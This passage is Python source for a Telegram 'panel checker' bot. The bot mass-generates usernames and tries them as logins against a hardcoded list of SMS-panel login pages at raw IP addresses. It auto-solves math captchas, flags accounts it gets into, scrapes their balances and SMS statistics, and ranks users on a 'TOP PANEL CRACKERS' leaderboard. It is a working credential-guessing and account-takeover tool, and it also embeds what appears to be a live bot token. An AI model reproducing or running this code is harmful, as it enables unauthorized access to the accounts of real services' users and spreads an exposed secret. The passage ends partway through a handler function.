# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  🚀 ASIF PANEL CHECKER TELEGRAM BOT (VIP EDITION)              ║
║                                                                  ║
║  Develop by ASIF SAKHANI                                        ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import re
import sys
import time
import random
import sqlite3
import requests
import asyncio
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==================== CONFIG ====================
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8816710883:AAHrPkpvloATjfOG97zrpeSYXPHTlJc0WSY")
ADMIN_ID = [int(x.strip()) for x in os.environ.get("ADMIN_ID", "8093002631").split(",")]
ALLOWED_FILE = "allowed_users.txt"
LEADERBOARD_FILE = "leaderboard.json"
CUSTOM_PANELS_FILE = "custom_panels.json"
DB_FILE = "used_names.db"

TIMEOUT = 10
MAX_WORKERS = 30
DEFAULT_COUNT = 1000

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# ==================== ANIME GIFS COLLECTION ====================
ANIME_GIFS = [
    "https://media.tenor.com/7v6P9rRk7wIAAAAC/anime-smile.gif",
    "https://media.tenor.com/T0aXf6tFfxgAAAAC/anime-happy.gif",
    "https://media.tenor.com/K_e-7pMyk-UAAAAC/anime-dance.gif",
    "https://media.tenor.com/qL3f8-mH9wUAAAAC/anime-excited.gif",
    "https://media.tenor.com/5u9L9ZzE1sIAAAAC/anime-thumbs-up.gif",
    "https://media.tenor.com/h5oU4qF-HXEAAAAC/anime-wow.gif",
    "https://media.tenor.com/zW6p42g4V2QAAAAC/anime-cheer.gif",
    "https://media.tenor.com/N514Gf77l4EAAAAC/anime-blush.gif",
    "https://media.tenor.com/OqD0y-0wHUEAAAAC/anime-wink.gif",
    "https://media.tenor.com/1B2p85G9GgAAAAAC/anime-sparkle.gif"
]
random.shuffle(ANIME_GIFS)
current_gif_index = 0

def get_next_gif():
    global current_gif_index
    gif = ANIME_GIFS[current_gif_index]
    current_gif_index = (current_gif_index + 1) % len(ANIME_GIFS)
    return gif

# ==================== DATABASE (SQLite3) ====================
def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS names (username TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()

init_db()

def is_name_used(username):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT 1 FROM names WHERE username = ?", (username,))
    result = c.fetchone()
    conn.close()
    return bool(result)

def save_new_names_to_db(names_list):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.executemany("INSERT OR IGNORE INTO names (username) VALUES (?)", [(n,) for n in names_list])
    conn.commit()
    conn.close()

# ==================== USER MANAGEMENT ====================
def get_allowed_users():
    users = set([str(x) for x in ADMIN_ID])
    if os.path.exists(ALLOWED_FILE):
        with open(ALLOWED_FILE, "r") as f:
            for line in f:
                if line.strip():
                    users.add(line.strip().replace('@', '').lower())
    return list(users)

def add_allowed_user(user_input):
    user_input = str(user_input).replace('@', '').lower()
    if user_input not in get_allowed_users():
        with open(ALLOWED_FILE, "a") as f:
            f.write(f"{user_input}\n")
        return True
    return False

def is_user_allowed(user_id, username):
    allowed = get_allowed_users()
    if str(user_id) in allowed: return True
    if username and str(username).replace('@', '').lower() in allowed: return True
    return False

# ==================== LEADERBOARD & CUSTOM PANELS ====================
def load_leaderboard():
    if os.path.exists(LEADERBOARD_FILE):
        try:
            with open(LEADERBOARD_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def update_leaderboard(user_id, name, hits):
    if hits <= 0: return
    lb = load_leaderboard()
    uid = str(user_id)
    if uid not in lb: lb[uid] = {"name": name, "hits": 0}
    lb[uid]["name"] = name 
    lb[uid]["hits"] += hits
    with open(LEADERBOARD_FILE, "w") as f:
        json.dump(lb, f)

def load_custom_panels():
    if os.path.exists(CUSTOM_PANELS_FILE):
        try:
            with open(CUSTOM_PANELS_FILE, "r") as f: return json.load(f)
        except: pass
    return {}

def save_custom_panel(key, panel_data):
    customs = load_custom_panels()
    customs[key] = panel_data
    with open(CUSTOM_PANELS_FILE, "w") as f:
        json.dump(customs, f)

# ==================== PREMIUM ANIMATED EMOJIS ====================
_ANIMATED = {
    "⚠️": "6098337704682984714", "🛑": "6325507973896472524", "👋": "6026306335715365949",
    "🤕": "6325636152900453913", "❤️": "5287446418909328171", "💙": "5285528007342058142",
    "💚": "5287724290408477329", "💛": "5287501467505161665", "💜": "5287590605256418477",
    "👑": "5303547611351902889", "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "🚀": "4904936030232117798", "✅": "5444987348334965906", "❌": "5447647474984449520",
    "💰": "5283232570660634549", "🎉": "5172632227871196306", "⭐": "5343636681473935403",
    "📊": "5445146408153806223", "📋": "5444931419270839381", "📁": "5447408120752013199",
    "🎯": "5444987348334965906"
}

def premium_emoji(text: str) -> str:
    if not text: return text
    result = text
    for emoji, emoji_id in _ANIMATED.items():
        if emoji in result:
            result = result.replace(emoji, f'<tg-emoji emoji-id="{emoji_id}">{emoji}</tg-emoji>')
    return result

def btn(text, data): return InlineKeyboardButton(text, callback_data=data)
def url_btn(text, url): return InlineKeyboardButton(text, url=url)

def parse_panel_url(raw_url):
    url = raw_url.strip().rstrip('/')
    if url.lower().endswith('/login'): return url[:-6], "/login"
    elif url.lower().endswith('/signin'): return url[:-7], "/signin"
    else: return url, "/login"

# ======================== PAKISTANI & CUSTOM NAMES GENERATOR ========================
BOYS_NAMES = ["ahmed", "ali", "hassan", "hussain", "usman", "omar", "zain", "rayyan", "ayan", "ehsan", "bilal", "danish", "farhan", "haris", "imran", "junaid", "kamran", "luqman", "moeen", "nadeem", "osama", "qasim", "rashid", "salman", "tariq", "waqas", "yasir", "zeeshan", "asif", "abdullah", "tahir", "ahsan", "arslan", "azhar", "umar", "hamza", "faisal", "khalid"]
GIRLS_NAMES = ["ayesha", "fatima", "zara", "sana", "iqra", "mahira", "hira", "sara", "maha", "zainab", "maryam", "kiran", "nida", "uzma", "samina", "shazia", "tahira", "naila", "saima", "rabia", "warda", "hina", "amina", "khadija", "nadia"]
CAST_NAMES = ["rajput", "minhas", "bhatti", "chauhan", "jutt", "sial", "sandhu", "gill", "dhillon", "sidhu", "bajwa", "cheema", "waraich", "maan", "arain", "sindhi", "bhutto", "khan", "nawab", "baloch", "sheikh", "syed", "ansari", "awan", "butt", "qureshi", "mughal"]
SLANGS = ["mano", "billi", "titli", "jigar", "shehzada", "chanda", "babu", "janu", "pari", "boss", "hacker", "killer", "lover", "jani", "shona"]
CITIES = ["lahore", "karachi", "islamabad", "multan", "peshawar", "quetta", "faisalabad", "sialkot", "gujranwala", "rawalpindi"]
CUSTOM_SUFFIXES = ["786786", "As123", "786", "110", "12345", "007", "1122", "99", "100", "321", "123", "009"]

def generate_all_usernames(count):
    pool = set()
    all_bases = BOYS_NAMES + GIRLS_NAMES + CAST_NAMES + SLANGS
    attempts = 0
    max_attempts = count * 20
    while len(pool) < count and attempts < max_attempts:
        attempts += 1
        name = random.choice(all_bases)
        suffix = random.choice(CUSTOM_SUFFIXES)
        pool.add(name + suffix)
        pool.add(name.capitalize() + suffix)
        pool.add(name + name)
    pool_list = list(pool)
    random.shuffle(pool_list)
    return pool_list[:count]

def generate_unique_usernames(count):
    pool = set()
    all_bases = BOYS_NAMES + GIRLS_NAMES + CAST_NAMES
    attempts = 0
    max_attempts = count * 50 

    while len(pool) < count and attempts < max_attempts:
        attempts += 1
        name = random.choice(all_bases)
        suffix = random.choice(CUSTOM_SUFFIXES)
        city = random.choice(CITIES)
        slang = random.choice(SLANGS)
        
        variations = [
            name + suffix, 
            name.capitalize() + suffix,
            slang + name,
            name + city,
            slang + suffix,
            name + name
        ]
            
        for v in variations:
            if not is_name_used(v) and v not in pool:
                pool.add(v)
                if len(pool) >= count: break
                
    pool_list = list(pool)
    random.shuffle(pool_list)
    save_new_names_to_db(pool_list) 
    return pool_list

# ======================== CAPTCHA & STATS SOLVER ========================
def extract_math_question(text):
    pattern = r'(\d+)\s*([+\-*/])\s*(\d+)\s*[=?]'
    match = re.search(pattern, text)
    if match: return int(match.group(1)), match.group(2), int(match.group(3))
    return None

def compute_answer(num1, op, num2):
    if op == '+': return num1 + num2
    elif op == '-': return num1 - num2
    elif op == '*': return num1 * num2
    elif op == '/': return num1 // num2
    else: return 0

def extract_stats_multi_method(html_text, soup):
    stats = {'today': 0, 'week': 0, 'month': 0, 'balance': 0}
    pattern_sets = {
        'today': [r'Today\s*SMS\s*[:]?\s*([0-9,]+)', r'Today\s+SMS\s*([0-9,]+)', r'Today\s*OTP\s*[:]?\s*([0-9,]+)', r'Today\'s\s*SMS\s*[:]?\s*([0-9,]+)'],
        'week': [r'Last\s*7\s*Day\s*SMS\s*[:]?\s*([0-9,]+)', r'Last\s+7\s+Day\s+SMS\s*([0-9,]+)', r'Last\s*7\s*Days?\s*SMS\s*[:]?\s*([0-9,]+)', r'Weekly\s*SMS\s*[:]?\s*([0-9,]+)'],
        'month': [r'Last\s*30\s*Day\s*SMS\s*[:]?\s*([0-9,]+)', r'Last\s+30\s+Day\s+SMS\s*([0-9,]+)', r'Last\s*30\s*Days?\s*SMS\s*[:]?\s*([0-9,]+)', r'Monthly\s*SMS\s*[:]?\s*([0-9,]+)'],
        'balance': [r'Balance\s*[:]?\s*([0-9,.]+)', r'Available\s*[:]?\s*([0-9,.]+)', r'Credit\s*[:]?\s*([0-9,.]+)', r'Credits\s*[:]?\s*([0-9,.]+)']
    }
    
    for key, patterns in pattern_sets.items():
        for pat in patterns:
            m = re.search(pat, html_text, re.IGNORECASE)
            if m:
                try:
                    val = float(m.group(1).replace(',', ''))
                    stats[key] = int(val) if key != 'balance' else val
                    break
                except: pass

    label_map = {
        'today': ['Today SMS', 'Today\'s SMS', 'Today OTP'],
        'week': ['Last 7 Day SMS', 'Last 7 Days SMS', 'Weekly SMS'],
        'month': ['Last 30 Day SMS', 'Last 30 Days SMS', 'Monthly SMS'],
        'balance': ['Balance', 'Available', 'Credit']
    }
    
    for key, labels in label_map.items():
        if stats[key] != 0: continue
        for label in labels:
            elements = soup.find_all(string=re.compile(re.escape(label), re.I))
            for elem in elements:
                parent = elem.parent
                if parent:
                    parent_text = parent.get_text()
                    pos = parent_text.lower().find(label.lower())
                    if pos != -1:
                        after = parent_text[pos + len(label):]
                        m = re.search(r'[:]?\s*([0-9,.]+)', after)
                        if m:
                            try:
                                val = float(m.group(1).replace(',', ''))
                                stats[key] = int(val) if key != 'balance' else val
                                break
                            except: pass
                if stats[key] != 0: break
            if stats[key] != 0: break

    return stats

# ======================== CORE SMART CHECKER ========================
def check_credential(username, password, panel_config):
    session = requests.Session()
    session.verify = False
    headers = {"User-Agent": USER_AGENT}
    
    try:
        resp = session.get(panel_config["login_url"], headers=headers, timeout=TIMEOUT)
        resp.raise_for_status()
    except Exception: return None

    soup = BeautifulSoup(resp.text, 'html.parser')
    form = soup.find('form')
    if not form: return None

    action = form.get('action')
    post_url = urljoin(panel_config["login_url"], action) if action else panel_config["login_url"]

    inputs = form.find_all('input')
    username_field = password_field = answer_field = None
    for inp in inputs:
        name = inp.get('name', '').lower()
        if 'user' in name or 'login' in name: username_field = inp.get('name')
        elif 'pass' in name or 'pwd' in name: password_field = inp.get('name')
        elif 'answer' in name or 'captcha' in name or 'math' in name or 'capt' in name: answer_field = inp.get('name')

    if not username_field: username_field = 'username'
    if not password_field: password_field = 'password'
    if not answer_field: answer_field = 'answer'

    page_text = soup.get_text()
    math_data = extract_math_question(page_text)
    if not math_data:
        for elem in soup.find_all(['label', 'p', 'div', 'span']):
            text = elem.get_text()
            math_data = extract_math_question(text)
            if math_data: break
    if not math_data: math_data = extract_math_question(resp.text)
        
    if math_data:
        num1, op, num2 = math_data
        answer = compute_answer(num1, op, num2)
    else: answer = random.randint(1, 20)

    data = {
        username_field: username,
        password_field: password,
        answer_field: str(answer)
    }

    try:
        post_resp = session.post(post_url, data=data, headers=headers, timeout=TIMEOUT, allow_redirects=False)
        post_resp.raise_for_status()
    except Exception: return None

    is_valid = False
    role = "Unknown"
    location = post_resp.headers.get('Location', '').lower()
    
    if post_resp.status_code in [301, 302, 303] and location and location not in ('./', '/'):
        is_valid = True
        if 'client' in location: role = "Client"
        elif 'agent' in location: role = "Agent"
        else: role = "Mix"
    else:
        text = post_resp.text.lower()
        if "invalid username" in text or "username not found" in text: is_valid = False
        elif "invalid password" in text or "wrong password" in text: is_valid = False 
        elif "dashboard" in text or "welcome" in text:
            is_valid = True
            role = "Client"
            
    if is_valid:
        sms_stats = {"today": 0, "seven_days": 0, "thirty_days": 0, "balance": 0}
        try:
            dash_url = urljoin(panel_config["base_url"], location) if location else post_url
            dash_resp = session.get(dash_url, headers=headers, timeout=TIMEOUT)
            dash_soup = BeautifulSoup(dash_resp.text, 'html.parser')
            stats = extract_stats_multi_method(dash_resp.text, dash_soup)
            
            sms_stats['today'] = stats.get('today', 0)
            sms_stats['seven_days'] = stats.get('week', 0)
            sms_stats['thirty_days'] = stats.get('month', 0)
            sms_stats['balance'] = stats.get('balance', 0)
        except: pass
        return (username, password, role, sms_stats)
    return None

# ==================== PANELS INIT ====================
CLI_PANELS_LIST = [
    ("Lamix SMS", "http://51.210.208.26/ints/login"),
    ("IMS SMS", "http://45.82.67.20/ints/login"),
    ("Astra SMS", "http://51.161.128.71/ints/login"),
    ("Green SMS", "http://139.99.9.4/ints/login"),
    ("Core SMS", "http://139.99.68.231/ints/login"),
    ("Sniper", "http://135.125.222.224/ints/login"),
    ("Flynixx", "http://185.255.93.125/"),
    ("Its Panel", "http://51.77.132.62/ints/login"),
    ("Ism SMS Panel", "http://51.75.131.196/ints/login"),
    ("Emo Panel", "http://139.99.69.196/ints/login"),
    ("Zento SMS", "http://54.38.176.48/ints/login"),
    ("Proof SMS", "http://217.182.195.194/ints/login"),
    ("Flex SMS", "http://168.119.13.175/ints/login"),
    ("Bolt SMS", "http://93.190.143.35/ints/Login"),
    ("Flyn SMS", "http://91.232.105.47/ints/login"),
    ("MSI SMS", "http://145.239.130.45/ints/login"),
    ("Proton SMS", "http://109.236.84.81/ints/login"),
    ("Seven1Tel", "http://94.23.120.156/ints/login"),
    ("KM SMS", "http://54.36.173.235/ints/login"),
    ("SOTY Technologies", "http://45.14.135.150/ints/login"),
    ("Squad SMS", "http://51.77.221.209/ints/login"),
    ("IPRN SMS", "http://175.110.115.25/ints/login"),
    ("Zyron SMS", "http://151.80.19.204/ints/login"),
    ("Zero", "http://62.112.11.47/ints/login"),
    ("Rsayel", "http://176.9.58.30/ints/login"),
    ("SMSHadi", "http://www.smshadi.net/login"),
    ("MBC SMS", "https://mbcs-ms.com/agent/dashboard"),
    ("PSCall", "https://pscall.net/agent/SMSDashboard"),
    ("Meteorite", "http://217.23.5.21/ints/"),
    ("Wolf", "http://213.32.24.208/ints/login"),
    ("Voicegate", "http://139.99.68.183/ints/login"),
    ("Sms", "http://85.195.94.50/sms/SignIn"),
    ("iOS SMS", "http://139.99.9.120/ints/login"),
    ("Shark SMS", "http://65.109.111.158/ints/login"),
    ("EVS", "http://57.129.107.62/ints/login"),
    ("Prime SMS", "http://54.36.169.49/ints/login")
]

PANELS = {}
for idx, (p_name, p_url) in enumerate(CLI_PANELS_LIST):
    b_url, l_suffix = parse_panel_url(p_url)
    key = re.sub(r'[^a-zA-Z0-9]', '', p_name.lower())
    if not key: key = f"panel_{idx}"
    PANELS[key] = {
        "name": p_name,
        "icon": random.choice(["⚡", "💚", "⭐", "💜", "❤️", "📱", "😊", "🐺", "🎤", "🌟", "🎯", "🌀", "👥", "🍎", "⚙️", "🦈", "🌍", "💪", "🔹", "🔸", "📨", "✅", "🏢", "📞", "👑", "🔢"]),
        "base_url": b_url,
        "login_url": f"{b_url}{l_suffix}"
    }
PANELS.update(load_custom_panels())

# ==================== BOT HANDLERS ====================
user_sessions = {}

class UserSession:
    def __init__(self, user_id, first_name):
        self.user_id = user_id
        self.first_name = first_name
        self.current_panel_config = None
        self.target_role = "Mix" 
        self.count = DEFAULT_COUNT
        self.running = False
        self.results = []
        self.stats = {"total": 0, "valid": 0, "invalid": 0}
        self.start_time = None
        self.state = None
        self.temp_url = None
        self.custom_names = None

def get_main_keyboard():
    return InlineKeyboardMarkup([
        [btn("📋 ALL PANELS", "panel_select")],
        [btn("📊 MY STATS", "show_stats"), btn("🏆 LEADERBOARD", "top_rank")],
        [btn("🛑 STOP PROCESS", "stop_all")],
        [url_btn("👨‍💻 ADMIN", "https://t.me/Asifsakhani786")]
    ])

# ==================== COMMANDS ====================
async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    msg = premium_emoji(f"🆔 <b>Your Telegram ID is:</b> <code>{user_id}</code>")
    await update.message.reply_text(msg, parse_mode="HTML")

async def addpanel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    if not context.args:
        await update.message.reply_text(premium_emoji("❌ <b>Usage:</b> <code>/addpanel http://example.com/ints</code>"), parse_mode="HTML")
        return
    url = context.args[0]
    if user_id not in user_sessions: user_sessions[user_id] = UserSession(user_id, update.effective_user.first_name)
    session = user_sessions[user_id]
    session.temp_url = url
    session.state = "WAITING_PANEL_NAME"
    await update.message.reply_text(premium_emoji("🔗 <b>URL Saved!</b>\n\n👇 Please reply to this chat with a <b>Name</b> for this Panel:"), parse_mode="HTML")

async def new_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    if not context.args:
        await update.message.reply_text(premium_emoji("❌ <b>Usage:</b> <code>/new http://example.com/ints/login</code>"), parse_mode="HTML")
        return
    url = context.args[0]
    if user_id not in user_sessions: user_sessions[user_id] = UserSession(user_id, update.effective_user.first_name)
    session = user_sessions[user_id]
    session.temp_url = url
    session.state = "WAITING_NEW_COUNT"
    await update.message.reply_text(premium_emoji("🎯 <b>Target URL Saved!</b>\n\n🔢 How many usernames want to add? (e.g. <code>1000</code>)"), parse_mode="HTML")

async def gennam_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    if user_id not in user_sessions: user_sessions[user_id] = UserSession(user_id, update.effective_user.first_name)
    session = user_sessions[user_id]
    
    try:
        count = int(context.args[0]) if context.args else 1000
        count = max(10, min(count, 15000))
    except: count = 1000
        
    msg = await update.message.reply_text(premium_emoji(f"⏳ <b>Generating {count} UNIQUE names...</b>\nChecking SQLite database to ensure no repeats..."), parse_mode="HTML")
    
    new_combos = generate_unique_usernames(count)
    session.custom_names = new_combos 
    session.count = len(new_combos)
    
    keyboard = [[btn("✅ YES, START CHECK", "gennam_yes")], [btn("❌ NO, CANCEL", "cancel")]]
    await msg.edit_text(premium_emoji(f"✅ <b>Successfully generated {len(new_combos)} completely NEW names!</b> 💥\n\nYe names bot mein pehle kabhi check nahi hue.\n\n👇 <b>Want to start checking now?</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    session = user_sessions.get(user_id)
    if not session or not session.state: return
    text = update.message.text.strip()
    
    if session.state == "WAITING_PANEL_NAME":
        name = text[:20]
        key = f"custom_{int(time.time())}"
        base_url, login_suffix = parse_panel_url(session.temp_url)
        new_panel = {"name": name, "icon": "🔗", "base_url": base_url, "login_url": f"{base_url}{login_suffix}"}
        PANELS[key] = new_panel
        save_custom_panel(key, new_panel)
        session.state = None
        session.temp_url = None
        await update.message.reply_text(premium_emoji(f"✅ <b>Panel Added Successfully!</b>\nName: {name}\nIt is now available in /panel list."), parse_mode="HTML")
        
    elif session.state == "WAITING_NEW_COUNT":
        if not text.isdigit():
            await update.message.reply_text(premium_emoji("❌ <b>Please send a valid number!</b>"), parse_mode="HTML")
            return
        count = max(10, min(int(text), 15000))
        session.count = count
        base_url, login_suffix = parse_panel_url(session.temp_url)
        session.current_panel_config = {"name": "Custom Target", "icon": "🎯", "base_url": base_url, "login_url": f"{base_url}{login_suffix}"}
        session.state = None
        session.temp_url = None
        keyboard = [[btn("👑 AGENT ONLY", f"role_Agent")], [btn("👤 CLIENT ONLY", f"role_Client")], [btn("🔄 MIX BOTH", f"role_Mix")], [btn("🚫 CANCEL", "cancel")]]
        await update.message.reply_text(premium_emoji(f"🎯 <b>Custom URL Configured!</b>\n📊 Count: {count}\n\n👇 <b>Select Account Type to start:</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")
        
    elif session.state == "WAITING_GENNAM_NEW_URL":
        url = text.strip()
        if not url.startswith("http"):
            await update.message.reply_text(premium_emoji("❌ <b>Invalid URL!</b> Please start with http:// or https://"), parse_mode="HTML")
            return
        base_url, login_suffix = parse_panel_url(url)
        session.current_panel_config = {"name": "Custom Target", "icon": "🎯", "base_url": base_url, "login_url": f"{base_url}{login_suffix}"}
        session.state = None
        keyboard = [[btn("👑 AGENT ONLY", f"role_Agent")], [btn("👤 CLIENT ONLY", f"role_Client")], [btn("🔄 MIX BOTH", f"role_Mix")], [btn("🚫 CANCEL", "cancel")]]
        await update.message.reply_text(premium_emoji(f"🎯 <b>New URL Configured!</b>\n\n👇 <b>Select Account Type to start checking {len(session.custom_names)} generated names:</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def add_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    admin_id = update.effective_user.id
    if admin_id not in ADMIN_ID: return 
    try:
        new_user = context.args[0]
        if add_allowed_user(new_user):
            await update.message.reply_text(premium_emoji(f"✅ <b>User Added Successfully!</b>\nTarget: <code>{new_user}</code>"), parse_mode="HTML")
            if new_user.isdigit():
                welcome_msg = premium_emoji("""
🎉 <b>CONGRATULATIONS!</b> 💥
━━━━━━━━━━━━━━━━━━
💎 <b>Access Granted!</b>
You now have full premium access to the <b>Panel Checker Bot</b>.
━━━━━━━━━━━━━━━━━━
🚀 Send /start to begin!
💡 <b>Develop by:</b> <a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>""")
                try: await context.bot.send_message(chat_id=int(new_user), text=welcome_msg, parse_mode="HTML", disable_web_page_preview=True)
                except: pass
        else: await update.message.reply_text(premium_emoji(f"⚠️ <b>User is already allowed!</b>"), parse_mode="HTML")
    except IndexError: await update.message.reply_text(premium_emoji("❌ <b>Usage:</b> <code>/add @username</code> OR <code>/add 123456789</code>"), parse_mode="HTML")

async def top_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    lb = load_leaderboard()
    if not lb:
        await update.message.reply_text(premium_emoji("📭 <b>Leaderboard is empty!</b>"), parse_mode="HTML")
        return
    sorted_lb = sorted(lb.values(), key=lambda x: x["hits"], reverse=True)
    text = premium_emoji("🏆 <b>TOP PANEL CRACKERS</b> 🏆\n━━━━━━━━━━━━━━━━━━\n")
    medals = ["🥇", "🥈", "🥉"]
    for i, user in enumerate(sorted_lb[:10]):
        rank = medals[i] if i < 3 else f"#{i+1}"
        text += f"{rank} <b>{user['name']}</b> ➾ {user['hits']} Hits\n"
    text += "━━━━━━━━━━━━━━━━━━\n💡 <b>Develop by:</b> <a href='https://t.me/Asifsakhani786'>ASIF SAKHANI</a>"
    await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    first_name = update.effective_user.first_name
    if not is_user_allowed(user_id, username):
        await update.message.reply_text(premium_emoji("❌ <b>Unauthorized!</b>\nYou do not have access to this bot.\nCheck ID: /id"), parse_mode="HTML")
        return
    if user_id not in user_sessions: user_sessions[user_id] = UserSession(user_id, first_name)
    else:
        user_sessions[user_id].first_name = first_name
        user_sessions[user_id].state = None
    flower_gif = "https://media.tenor.com/J7b0E28H8L8AAAAC/flowers-falling.gif"
    try: await update.message.reply_animation(animation=flower_gif)
    except: pass 
    await send_main_menu(update.message, user_id, first_name, is_query=False)

async def send_main_menu(update_or_query, user_id, first_name, is_query=False):
    user_link = f'<a href="tg://user?id={user_id}">{first_name}</a>'
    admin_link = '<a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>'
    welcome_text = premium_emoji(f"""
🎉💥🌸
━━━━━━━━━━━━━━━━━━
👋 <b>Welcome Back</b> · {user_link}
🛡 <b>Panel Checker Bot (VIP)</b>
━━━━━━━━━━━━━━━━━━
<code>/panel</code> → Select Saved Panel
<code>/gennam 1000</code> → Generate Unique Combos
<code>/addpanel url</code> → Save custom Panel
<code>/new url</code> → Instant check URL
<code>/count 1000</code> → Set Combo Count
<code>/stats</code> → Check Stats
<code>/top</code> → Leaderboard Ranking
<code>/stop</code> → Stop Process
━━━━━━━━━━━━━━━━━━
💡 <b>Develop by</b> · {admin_link}
━━━━━━━━━━━━━━━━━━""")
    if is_query: await update_or_query.edit_message_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML", disable_web_page_preview=True)
    else: await update_or_query.reply_text(welcome_text, reply_markup=get_main_keyboard(), parse_mode="HTML", disable_web_page_preview=True)

async def count_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    first_name = update.effective_user.first_name
    if not is_user_allowed(user_id, username): return
    if user_id not in user_sessions: user_sessions[user_id] = UserSession(user_id, first_name)
    try:
        count = int(context.args[0]) if context.args else DEFAULT_COUNT
        count = max(10, min(count, 15000))
        user_sessions[user_id].count = count
        await update.message.reply_text(premium_emoji(f"✅ <b>Count updated to:</b> <code>{count}</code>"), parse_mode="HTML")
    except: await update.message.reply_text(premium_emoji("❌ <b>Usage:</b> <code>/count 1000</code>"), parse_mode="HTML")

async def panel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    keyboard, row = [], []
    for key, panel in PANELS.items():
        row.append(btn(f"{panel['icon']} {panel['name']}", f"panel_{key}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row: keyboard.append(row)
    keyboard.append([btn("🚫 CANCEL", "cancel")])
    await update.message.reply_text(premium_emoji("📋 <b>Select a Panel to Check:</b>"), reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    session = user_sessions.get(user_id)
    if not session:
        await update.message.reply_text(premium_emoji("📭 <b>No session found. Use /start first.</b>"), parse_mode="HTML")
        return
    admin_link = '<a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>'
    stats_text = premium_emoji(f"""
📊 <b>Your Session Stats</b>
━━━━━━━━━━━━━━━━━━
📋 <b>Total Panels:</b> {len(PANELS)}
📊 <b>Count:</b> {session.count}
✅ <b>Valid:</b> {session.stats['valid']}
❌ <b>Invalid:</b> {session.stats['invalid']}
📦 <b>Total:</b> {session.stats['total']}
━━━━━━━━━━━━━━━━━━
💡 <b>Develop by:</b> {admin_link}""")
    await update.message.reply_text(stats_text, parse_mode="HTML", disable_web_page_preview=True)

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    admin_link = '<a href="https://t.me/Asifsakhani786">ASIF SAKHANI</a>'
    help_text = premium_emoji(f"""
📖 <b>Help Menu</b>
━━━━━━━━━━━━━━━━━━
<code>/gennam 1000</code> → Generate Unique Combos
<code>/new url</code> → Instant check URL
<code>/addpanel url</code> → Save custom Panel
<code>/panel</code> → Select saved panel
<code>/count 1000</code> → Set combo count
<code>/top</code> → Leaderboard Ranking
<code>/stop</code> → Stop running process
<code>/add</code> → Add User (Admin)
━━━━━━━━━━━━━━━━━━
💡 <b>Develop by:</b> {admin_link}""")
    await update.message.reply_text(help_text, parse_mode="HTML", disable_web_page_preview=True)

async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username if update.effective_user.username else ""
    if not is_user_allowed(user_id, username): return
    session = user_sessions.get(user_id)
    if session and session.running:
        session.running = False
        await update.message.reply_text(premium_emoji("🛑 <b>Your processing has been stopped.</b>"), parse_mode="HTML")
    else: await update.message.reply_text(premium_emoji("📭 <b>No active process to stop.</b>"), parse_mode="HTML")

async def start_callback(query):
    user_id = query.from_user.id
    first_name = query.from_user.first_name
    await send_main_menu(query.message, user_id, first_name, is_query=True)

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    username = query.from_user.username if query.from_user.username else ""
    first_name = query.from_user.first_name
    await query.answer()
    
    if not is_user_allowed(user_id, username): return
    if user_id not in user_sessions: user_sessions[user_id] = UserSession(user_id, first_name)
    else: user_sessions[user_id].first_name = first_name
